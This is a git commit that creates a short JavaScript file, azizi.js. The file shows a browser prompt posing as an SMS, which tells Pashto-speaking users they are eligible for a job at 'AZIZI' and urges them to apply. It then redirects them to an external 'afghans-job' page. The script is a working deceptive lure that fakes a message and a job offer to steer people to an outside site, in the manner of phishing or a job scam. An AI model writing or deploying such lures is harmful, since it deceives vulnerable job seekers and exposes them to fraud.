a4ab274126c5e22cdc687e6a354785f5350fa5b8
sureconnect001 <ukpe247@gmail.com>
2025-05-27 06:24:24 +0100

    Create azizi.js

---
+++ azizi.js
@@ -0,0 +1,5 @@
+var password = 'همدا اوس درخواست وکړئ'
+password=prompt('SMS: مبارک شه، تاسو په AZIZI کې د کار کولو وړ یاست، اوس د غوښتنلیک سپارلو لپاره Ok کلیک وکړئ. ','همدا اوس درخواست وکړئ');
+if (password != 'همدا اوس درخواست وکړئ') {
+location.href='https://sure-connect.org/afghans-job.html';
+}
